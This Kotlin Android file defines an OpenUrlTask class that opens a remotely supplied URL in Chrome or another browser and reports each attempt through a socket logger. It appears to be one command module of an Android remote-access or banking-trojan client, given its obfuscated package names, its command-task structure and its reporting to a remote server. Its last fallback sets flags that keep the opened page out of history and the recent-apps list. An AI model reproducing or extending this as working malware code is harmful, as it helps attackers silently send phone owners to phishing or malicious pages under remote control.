package com.xxx.zzz.commandp.taskssv

import android.content.Context
import android.content.Intent
import android.net.Uri
import com.xxx.zzz.socketsp.IOSocketyt
import org.json.JSONObject

class OpenUrlTask(private val ctx: Context, private val url: String?) : BaseTask(ctx) {

    private fun openUrl() {
        runCatching {
            val intent = Intent(Intent.ACTION_VIEW)
            intent.data = Uri.parse(url)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            intent.`package` = "com.android.chrome"  
            ctx.startActivity(intent)

            val obj = JSONObject()
            obj.put("openUrlBraw", "ok")
            IOSocketyt.sendLogs("", obj.toString(), "openUrlBraw1")
        }.onFailure {
            IOSocketyt.sendLogs("", "OpenUrlTask1 ${it.localizedMessage}", "error")

            try {
                val browserIntent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(browserIntent)

                val obj = JSONObject()
                obj.put("openUrlBraw", "ok")
                IOSocketyt.sendLogs("", obj.toString(), "openUrlBraw2")
            } catch (ex: Exception) {
                IOSocketyt.sendLogs("", "OpenUrlTask2 ${it.localizedMessage}", "error")

                val browserIntent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                browserIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
                browserIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                    .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                ctx.startActivity(browserIntent)

                val obj = JSONObject()
                obj.put("openUrlBraw", "ok")
                IOSocketyt.sendLogs("", obj.toString(), "openUrlBraw3")
            }
        }
    }

    override fun run() {
        super.run()
        runCatching {
            openUrl()
        }.onFailure {
            IOSocketyt.sendLogs("", "OpenUrlTask3 ${it.localizedMessage}", "error")
        }
    }

}
